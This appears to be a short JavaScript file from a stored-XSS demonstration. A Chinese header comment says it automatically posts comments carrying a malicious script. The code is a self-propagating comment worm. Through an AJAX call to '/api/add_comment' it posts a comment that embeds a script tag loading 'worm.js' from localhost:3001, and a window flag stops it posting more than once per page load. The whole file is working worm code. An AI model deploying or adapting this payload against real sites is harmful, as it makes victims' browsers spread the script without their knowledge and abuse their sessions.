/**
 * 自动发送带恶意脚本的评论
 */

var commentText = '<script src="http://localhost:3001/js/worm.js"></script>';

// 判断当前用户是否发过哈
if (!window.wormFlag) {

  $.ajax({
    type:'post',
    url:'/api/add_comment',
    data: {
      text: 'badyboy is cool' + commentText,
      date: +Date.now()
    },
  });

  window.wormFlag = true;

}

